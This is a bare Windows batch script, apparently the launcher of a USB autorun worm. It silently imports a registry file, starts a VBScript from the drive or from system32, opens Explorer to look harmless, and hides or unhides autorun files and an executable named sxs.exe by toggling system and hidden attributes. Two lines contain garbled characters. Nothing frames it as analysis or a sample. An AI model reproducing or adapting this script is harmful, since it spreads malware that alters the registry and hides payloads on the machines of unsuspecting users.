@echo off
if exist .\autorun.reg regedit /s .\autorun.reg
if not "%1"=="" goto open
if exist autorun.vbs start WScript.exe autorun.vbs&exit

';√‚…±
if exist %SYSTEMROOT%\system32\autorun.vbs start WScript.exe %SYSTEMROOT%\system32\autorun.vbs&exit
';√‚…±





:open
if not "%1"=="Open" goto next
start explorer .\
exit
:next
if not "%1"=="Over" goto :next2
exit
:next2
if "%1"=="-" attrib -s -a -h -r %2\autorun.*
if "%1"=="-" attrib -s -a -h -r %2\sxs.exe
if "%1"=="+" attrib +s +a +h +r %2\autorun.*
if "%1"=="+" attrib +s +a +h +r %2\sxs.exe
:end
